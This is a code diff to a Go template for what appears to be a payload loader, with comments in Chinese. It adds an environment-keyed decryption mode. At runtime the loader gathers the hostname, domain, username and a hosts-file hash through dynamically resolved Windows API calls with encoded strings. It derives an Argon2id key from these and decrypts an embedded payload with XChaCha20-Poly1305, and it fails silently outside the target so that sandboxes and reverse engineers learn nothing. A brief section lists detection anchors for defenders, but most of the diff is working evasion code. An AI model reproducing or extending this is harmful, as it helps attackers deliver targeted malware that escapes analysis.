@@ -1,7 +1,10 @@
 {{define "_crypto"}}
 // ============================================================
-// 解密函数
+// 解密函数 + 运行时密钥派生
 // ============================================================
+
+// ── 传统模式：AES-256-GCM + Argon2id 硬编码密码 ──
+// 当未启用 -env-bind 时使用此路径
 
 func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
 	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
@@ -25,7 +28,7 @@ func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
 	}
 	nonceSize := gcm.NonceSize()
 	if len(ciphertext) < nonceSize {
-		return nil, err
+		return nil, errors.New("ciphertext too short for AES-GCM nonce")
 	}
 	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
@@ -52,4 +55,206 @@ func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
 	}
 	return plaintext, nil
 }
+
+{{if .EnableEnvBind}}
+// ============================================================
+// 环境绑定加密模式 — v2.0 核心安全升级
+// ============================================================
+//
+// 【原理】
+//   传统模式的 Argon2id 密码是硬编码的静态字符串，逆向工程师提取后
+//   可在任何环境解密 payload。环境绑定模式将密钥与目标主机特征绑定：
+//
+//   密钥派生流程：
+//     1. 运行时采集环境特征（主机名、域名、用户名、hosts 文件哈希）
+//     2. 排序 + 拼接 → SHA-256 哈希 → 32 字节摘要
+//     3. Argon2id(SHA-256 摘要, 嵌入的 salt) → 32 字节密钥
+//     4. XChaCha20-Poly1305 解密（24 字节 nonce，比 AES-GCM 更大的 nonce 空间）
+//
+//   如果运行环境与编译时指定的不匹配 → SHA-256 不同 → 密钥错误 → 解密失败 → 静默退出
+//
+// 【为什么选择 XChaCha20-Poly1305 而非 AES-GCM】
+//   - 24 字节 nonce（vs AES-GCM 的 12 字节）：nonce 碰撞概率极低
+//   - 纯软件实现，不依赖 AES-NI 指令集（部分沙箱 VM 可能不支持）
+//   - Go 标准库 golang.org/x/crypto 原生支持，无需 CGO
+//
+// 【抗沙箱/逆向优势】
+//   - 沙箱环境的主机名/域名/用户名与目标不同 → 自动解密失败
+//   - 逆向工程师即使提取了 salt 和密文，也无法在非目标环境重建密钥
+//   - 不需要额外的反沙箱检查 — 加密本身就是环境校验
+//   - 静默失败：不输出错误信息，不触发异常，沙箱无法判断是"检测到沙箱"还是"程序 bug"
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - 行为特征：程序启动后立即调用 GetComputerNameW + GetUserNameW + 读取 hosts 文件
+//     然后进行密钥派生（Argon2id 的高内存消耗可被监控）
+//   - Sigma 规则：进程在短时间内同时访问多个环境信息 API + 执行加密操作
+//   - 内存取证：Argon2id 的 64MB 工作内存在进程内存中可被识别
+
+// collectEnvFeature 采集单个环境特征值
+// 支持的特征：hostname, domain, username, hostsfile
+func collectEnvFeature(feature string) string {
+	k32 := kernel32()
+	switch feature {
+	case "hostname":
+		// 通过 GetComputerNameW 获取主机名
+		getCompName := getProcAddr(k32, ds("{{index .EncodedStrings "GetComputerNameW"}}"))
+		if getCompName == 0 {
+			return ""
+		}
+		buf := make([]uint16, 256)
+		size := uint32(len(buf))
+		ret, _, _ := syscall.Syscall(getCompName, 2,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(unsafe.Pointer(&size)), 0)
+		if ret == 0 {
+			return ""
+		}
+		return syscall.UTF16ToString(buf[:size])
+
+	case "domain":
+		// 通过环境变量 USERDOMAIN 获取域名
+		getEnvVar := getProcAddr(k32, ds("{{index .EncodedStrings "GetEnvironmentVariableW"}}"))
+		if getEnvVar == 0 {
+			return ""
+		}
+		varName, _ := syscall.UTF16PtrFromString("USERDOMAIN")
+		buf := make([]uint16, 256)
+		ret, _, _ := syscall.Syscall(getEnvVar, 3,
+			uintptr(unsafe.Pointer(varName)),
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)))
+		if ret == 0 {
+			return ""
+		}
+		return syscall.UTF16ToString(buf[:ret])
+
+	case "username":
+		// 通过 GetUserNameW 获取用户名
+		getUserName := getProcAddr(advapi32(), ds("{{index .EncodedStrings "GetUserNameW"}}"))
+		if getUserName == 0 {
+			return ""
+		}
+		buf := make([]uint16, 256)
+		size := uint32(len(buf))
+		ret, _, _ := syscall.Syscall(getUserName, 2,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(unsafe.Pointer(&size)), 0)
+		if ret == 0 {
+			return ""
+		}
+		return syscall.UTF16ToString(buf[:size])
+
+	case "hostsfile":
+		// 读取 hosts 文件并计算 SHA-256 哈希
+		hostsPath := "C:\\Windows\\System32\\drivers\\etc\\hosts"
+		data, err := os.ReadFile(hostsPath)
+		if err != nil {
+			return ""
+		}
+		hash := sha256.Sum256(data)
+		return base64.StdEncoding.EncodeToString(hash[:])
+	}
+	return ""
+}
+
+// deriveRuntimeKey 运行时密钥派生 — 环境绑定模式的核心
+//
+// 流程：
+//   1. 遍历编译时注入的 envBindFeatures 列表（如 ["hostname", "domain"]）
+//   2. 对每个特征调用 collectEnvFeature() 采集当前环境值
+//   3. 构建 "key=value" 对，排序后拼接
+//   4. SHA-256 哈希 → 与编译时嵌入的 envBindHash 比对
+//   5. 匹配则以 SHA-256 摘要作为 Argon2id password 派生 32 字节密钥
+//   6. 不匹配 → 返回 nil → 调用方静默退出
+//
+// 【安全设计】
+//   - envBindHash 是编译时预计算的期望哈希，用于快速判断环境是否匹配
+//   - 即使攻击者提取了 envBindHash，也无法反推原始环境值（SHA-256 单向性）
+//   - Argon2id 的高内存消耗（64MB）增加暴力破解成本
+func deriveRuntimeKey() []byte {
+	// 采集当前环境特征
+	pairs := make([]string, 0, len(envBindFeatures))
+	for _, feat := range envBindFeatures {
+		val := collectEnvFeature(feat)
+		pairs = append(pairs, feat+"="+val)
+	}
+
+	// 排序确保与 generator 侧一致
+	sort.Strings(pairs)
+
+	// SHA-256 哈希
+	combined := strings.Join(pairs, "\n")
+	hash := sha256.Sum256([]byte(combined))
+	hashB64 := base64.StdEncoding.EncodeToString(hash[:])
+
+	// 与编译时嵌入的期望哈希比对
+	// 不匹配说明运行环境与目标不同 → 静默返回 nil
+	if hashB64 != envBindHash {
+		return nil
+	}
+
+	// 以 SHA-256 摘要作为 Argon2id 的 password，嵌入的 salt 派生最终密钥
+	salt, err := base64.StdEncoding.DecodeString(aesSaltBase64)
+	if err != nil {
+		return nil
+	}
+	key := argon2.IDKey(hash[:], salt, 1, 64*1024, 4, 32)
+	return key
+}
+
+// decryptChaCha20 使用 XChaCha20-Poly1305 解密
+//
+// 参数：
+//   encodedCiphertext — base64 编码的密文（前 24 字节为 nonce）
+//   encodedSalt       — base64 编码的 salt（本函数未直接使用，密钥由调用方传入）
+//   key               — 32 字节密钥（由 deriveRuntimeKey 派生）
+//
+// 解密流程：
+//   1. base64 解码密文
+//   2. 分离 24 字节 nonce 和实际密文
+//   3. XChaCha20-Poly1305 解密 + 认证
+//   4. 可选 zlib 解压
+//   5. XOR 解密层（与 AES-GCM 路径保持一致）
+func decryptChaCha20(encodedCiphertext, encodedSalt string, key []byte) ([]byte, error) {
+	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
+	if err != nil {
+		return nil, err
+	}
+
+	aead, err := chacha20poly1305.NewX(key)
+	if err != nil {
+		return nil, err
+	}
+
+	nonceSize := aead.NonceSize() // 24 字节（XChaCha20）
+	if len(ciphertext) < nonceSize {
+		return nil, errors.New("ciphertext too short for XChaCha20 nonce")
+	}
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+
+	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	if enableCompress {
+		reader, err := zlib.NewReader(bytes.NewReader(plaintext))
+		if err != nil {
+			return nil, err
+		}
+		defer reader.Close()
+		plaintext, err = io.ReadAll(reader)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	// XOR 解密层（与 AES-GCM 路径一致，使用密钥前 8 字节）
+	xorKey := key[:8]
+	for i := range plaintext {
+		plaintext[i] ^= xorKey[i%8]
+	}
+	return plaintext, nil
+}
+{{end}}
 {{end}}
